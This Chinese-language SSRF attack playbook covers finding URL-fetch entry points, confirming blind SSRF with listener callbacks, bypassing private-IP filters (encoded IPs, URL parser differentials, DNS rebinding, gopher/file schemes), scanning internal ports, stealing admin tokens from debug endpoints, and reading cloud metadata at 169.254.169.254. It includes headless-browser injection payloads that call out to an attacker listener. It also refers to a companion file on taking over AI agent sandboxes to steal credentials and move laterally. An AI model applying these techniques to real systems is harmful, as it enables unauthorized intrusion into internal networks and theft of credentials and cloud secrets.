# SSRF 内网实战

> 从"URL 可控入口"到"内网服务/云元数据"的完整打法。详细通用方法论见 `ssrf-test.md`。

## 一、入口识别词表

`url/uri/link/target/src/image/img/avatar/callback/webhook/proxy/fetch/preview/snapshot/screenshot/convert/import/upload_from_url/rss/subscribe/shorten/qrcode/share/export?url=`
以及：网页截图、HTML→PDF、链接预览卡片、文档/图片预览、在线解压、爬虫/收录、支付回调。

## 二、先确认 SSRF 可达性（不回显也能打）

1. 让目标访问你的监听器（`nc -l` / python http.server），看是否有回连（DNS/HTTP 都算）。
2. 无回连时用**时间差**：指向 `http://<内网不可达 IP>` 与可达目标对比响应时长。
3. 报错差异：`Connection refused` vs `timeout` vs 200，可判断端口开放。

## 三、私网过滤绕过（按顺序）

| 手法 | 例子 |
|---|---|
| 十进制 IP | `127.0.0.1` → `http://2130706433`；`172.19.0.2` → `2886926338` |
| 八/十六进制 | `0x7f.0.0.1`、`0177.0.0.1` |
| IPv6 映射 | `http://[::ffff:127.0.0.1]` |
| 解析差异 | `http://internal-api:5000\@x/../debug/config`（urllib 认为 host=x，requests 规范化后打到 internal-api） |
| 短域名/重定向 | 自己的域名 302 到内网；DNS 重绑定 |
| 主机名 | 内网服务名 `internal-api:5000`、`imds:8080`、`metadata` |
| 协议 | `file://`、`gopher://`、`dict://`（能打 Redis/FastCGI 时） |

## 四、打内网（拿到响应后）

1. 先看 `/api/status`、`/debug/config`、`/actuator/env` 类接口 → 泄露内网服务名/token。
2. 内网扫描：SSRF 当代理，用返回差异探 `172.19.0.0/24`、`10.0.0.0/8` 的常见端口（5000/8080/6379/2375/9200）。
3. 常见内网目标：`/debug/config`（admin_token）→ 用 token 打业务 `/admin/info`；Redis 未授权；云元数据。
4. 有回显时直接读响应；无回显时用外带（DNS/HTTP 到自己的监听器）。

## 五、无头浏览器渲染专项

- 入口：网页截图/快照/HTML→PDF/链接预览/云浏览器/URL 沙箱。
- 先确认是"真浏览器"：注入 `<script>fetch('http://你的监听')</script>`、`<img src>`、CSS 外链。
- 再打：`file://` 读本地文件、`http://169.254.169.254`、`chrome://`、PDF 生成器（wkhtmltopdf/Chromium N-day）。
- 渲染容器拿到执行后按 `../../ai-agent/knowledge/agent-sandbox-takeover-02-二、进站决策树.md` 打凭据/横向。

## 六、假点

- 只回显"URL 格式错误"且无任何请求发出 = 入口无 SSRF。
- 只能访问公网白名单 = 假点（除非白名单可绕）。
- 参数名未知时：把候选 key 一次性塞进同一 JSON body 命中（393 个 key 同 body），或逐 key 二分。
